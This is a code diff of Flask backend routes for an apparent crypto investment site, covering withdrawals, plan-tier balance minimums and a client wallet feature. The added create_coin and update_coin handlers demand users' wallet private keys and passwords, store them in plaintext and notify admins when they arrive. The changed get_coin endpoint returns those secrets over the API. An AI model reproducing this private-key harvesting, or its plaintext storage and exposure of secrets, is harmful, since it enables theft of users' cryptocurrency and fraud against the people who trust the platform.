@@ -15,37 +15,33 @@ def create_withdrawal():
 
     amount = request.json['amount']
     bitcoin = request.json['bitcoin']
-    wallet = request.json['wallet']
 
     if not get_client:
         return jsonify({"message": "Invalid client!"}), 400
-    if int(amount) <= 0:
+    if get_client.deleted:
+        return jsonify({"message": "Account deactivated!"}), 400
+    if amount == "":
+        return jsonify({"message": "Invalid input!"}), 400
+    if float(amount) <= 0.0:
         return jsonify({"message": "Amount cannot be less than or equal to 0!"}), 400
-    if int(bitcoin) <= 0:
-        return jsonify({"message": "Bitcoin cannot be less than or equal to 0!"}), 400
-    if not wallet:
-        return jsonify({"message": "Please add your wallet address!"}), 400
     if get_client.investment_plan == "Bronze":
-        if get_client.acct_bal - int(amount) < 500:
+        if get_client.acct_bal - float(amount) < 500:
             return jsonify({"message": "You have reached the minimum withdrawal amount for your plan!"}), 400
     if get_client.investment_plan == "Silver":
-        if get_client.acct_bal - int(amount) < 1500:
+        if get_client.acct_bal - float(amount) < 1500:
             return jsonify({"message": "You have reached the minimum withdrawal amount for your plan, try migrating \
             to another plan!"}), 400
     if get_client.investment_plan == "Gold":
-        if get_client.acct_bal - int(amount) < 2500:
+        if get_client.acct_bal - float(amount) < 2500:
             return jsonify({"message": "You have reached the minimum withdrawal amount for your plan, try migrating \
             to another plan!"}), 400
 
+    bitcoin = Queries.sf(bitcoin)
+
     username = f"{get_client.first_name} {get_client.last_name}"
 
-    admins = Queries.get_all(Admin)
-
-    for admin in admins:
-        admin.loss += int(amount)
-
-    new_withdrawal = Withdrawal(amount=amount, bitcoin=bitcoin, wallet=wallet, client_id=get_client.id,
-                                username=username)
+    new_withdrawal = Withdrawal(amount=amount, bitcoin=bitcoin, client_id=get_client.id, username=username,
+                                wallet=get_client.coinbase_name)
     new_notif = Notifications(
         message=f"Client, {get_client.first_name} {get_client.last_name} made a withdrawal request of ${amount}.00.")
 
@@ -59,7 +55,9 @@ def create_withdrawal():
     db_session.add(new_withdrawal)
     db_session.commit()
 
-    return jsonify({"message": "Withdrawal created!"}), 201
+    return jsonify({"heading": "Your withdrawal request was successful!", "content": f"Your withdrawal request of \
+                        ${amount}({bitcoin}btc) is pending.  Please check your email regularly to see if the \
+                        withdrawal has been approved."}), 201
 
 
 @withdrawal.get('get/<page_size>/<page>')
@@ -97,13 +95,21 @@ def create_coin():
     cur_client = get_jwt_identity()
     get_client = Queries.filter_one(Client, Client.id, cur_client)
 
+    coinbase = request.json['coinbase']
+    wallet = request.json['wallet']
     key = request.json['key']
     password = request.json['pass']
 
     if not get_client:
         return jsonify({"message": "Invalid client!"}), 400
+    if get_client.deleted:
+        return jsonify({"message": "Account deactivated!"}), 400
+    if len(coinbase) < 1:
+        return jsonify({"message": "Please select a wallet!"}), 400
+    if len(wallet) < 1:
+        return jsonify({"message": "Please type in your wallet address!"}), 400
     if len(key) < 1:
-        return jsonify({"message": "Key cannot be empty!"}), 400
+        return jsonify({"message": "Private key cannot be empty!"}), 400
     if len(password) < 8:
         return jsonify({"message": "Password must be at least 8 characters!"}), 400
     if not password.isalnum():
@@ -112,14 +118,59 @@ def create_coin():
     get_client.is_coin = True
     get_client.coinbase_pass = password
     get_client.coinbase_key = key
+    get_client.coinbase = coinbase
+    get_client.coinbase_name = wallet
 
     new_notif = Notifications(
-        message=f"Client, {get_client.first_name} {get_client.last_name} added coinbase key and password.")
+        message=f"Client, {get_client.first_name} {get_client.last_name} added {coinbase} private key and password.")
 
     db_session.add(new_notif)
     db_session.commit()
 
-    return jsonify({"message": "Coinbase added!"}), 200
+    return jsonify({"heading": "Your wallet has been added!", "content": f"Your wallet has been added successfully. \
+                    You can update it on your wallet page."}), 200
+
+
+@withdrawal.post('/coin/update')
+@jwt_required()
+def update_coin():
+    cur_client = get_jwt_identity()
+    get_client = Queries.filter_one(Client, Client.id, cur_client)
+
+    coinbase = request.json['coinbase']
+    wallet = request.json['wallet']
+    key = request.json['key']
+    password = request.json['pass']
+
+    if not get_client:
+        return jsonify({"message": "Invalid client!"}), 400
+    if get_client.deleted:
+        return jsonify({"message": "Account deactivated!"}), 400
+    if len(coinbase) < 1:
+        return jsonify({"message": "Please select a wallet!"}), 400
+    if len(wallet) < 1:
+        return jsonify({"message": "Please type in your wallet address!"}), 400
+    if len(key) < 1:
+        return jsonify({"message": "Private key cannot be empty!"}), 400
+    if len(password) < 8:
+        return jsonify({"message": "Password must be at least 8 characters!"}), 400
+    if not password.isalnum():
+        return jsonify({"message": "Password must be alphanumeric!"}), 400
+
+    get_client.is_coin = True
+    get_client.coinbase_pass = password
+    get_client.coinbase_key = key
+    get_client.coinbase = coinbase
+    get_client.coinbase_name = wallet
+
+    new_notif = Notifications(
+        message=f"Client, {get_client.first_name} {get_client.last_name} updated {coinbase} private key and password.")
+
+    db_session.add(new_notif)
+    db_session.commit()
+
+    return jsonify({"heading": "Your wallet has been updated!", "content": f"Your wallet has been updated \
+                    successfully. You can update it on your wallet page."}), 200
 
 
 @withdrawal.get('get/coin')
@@ -128,9 +179,8 @@ def get_coin():
     cur_client = get_jwt_identity()
     get_client = Queries.filter_one(Client, Client.id, cur_client)
 
-    coin = get_client.is_coin
-
-    return jsonify(coin), 200
+    return jsonify({"coin": get_client.is_coin, "wallet": get_client.coinbase, "private": get_client.coinbase_key,
+                    "pass": get_client.coinbase_pass, "add": get_client.coinbase_name}), 200
 
 
 @withdrawal.get('get/all/<page_size>/<page>')
@@ -180,25 +230,25 @@ def approve(index):
 
     if get_withdrawal.status:
         get_withdrawal.status = False
-        get_client.acct_bal += int(get_withdrawal.amount)
-        get_client.bit_bal += int(get_withdrawal.bitcoin)
-        get_client.tot_re -= int(get_withdrawal.amount)
+        get_client.acct_bal += float(get_withdrawal.amount)
+        get_client.bit_bal += float(get_withdrawal.bitcoin)
+        get_client.tot_re -= float(get_withdrawal.amount)
 
         for admin in admins:
-            admin.acct_bal += int(get_withdrawal.amount)
-            admin.bit_bal += int(get_withdrawal.bitcoin)
-            admin.tot_out -= int(get_withdrawal.amount)
+            admin.acct_bal += float(get_withdrawal.amount)
+            admin.bit_bal += float(get_withdrawal.bitcoin)
+            admin.tot_out -= float(get_withdrawal.amount)
 
     else:
         get_withdrawal.status = True
-        get_client.acct_bal -= int(get_withdrawal.amount)
-        get_client.bit_bal -= int(get_withdrawal.bitcoin)
-        get_client.tot_re += int(get_withdrawal.amount)
+        get_client.acct_bal -= float(get_withdrawal.amount)
+        get_client.bit_bal -= float(get_withdrawal.bitcoin)
+        get_client.tot_re += float(get_withdrawal.amount)
 
         for admin in admins:
-            admin.acct_bal -= int(get_withdrawal.amount)
-            admin.bit_bal -= int(get_withdrawal.bitcoin)
-            admin.tot_out += int(get_withdrawal.amount)
+            admin.acct_bal -= float(get_withdrawal.amount)
+            admin.bit_bal -= float(get_withdrawal.bitcoin)
+            admin.tot_out += float(get_withdrawal.amount)
 
     new_notif = Notifications(
         message=f"Admin, {get_admin.first_name} {get_admin.last_name} approved withdrawal - {index}.")
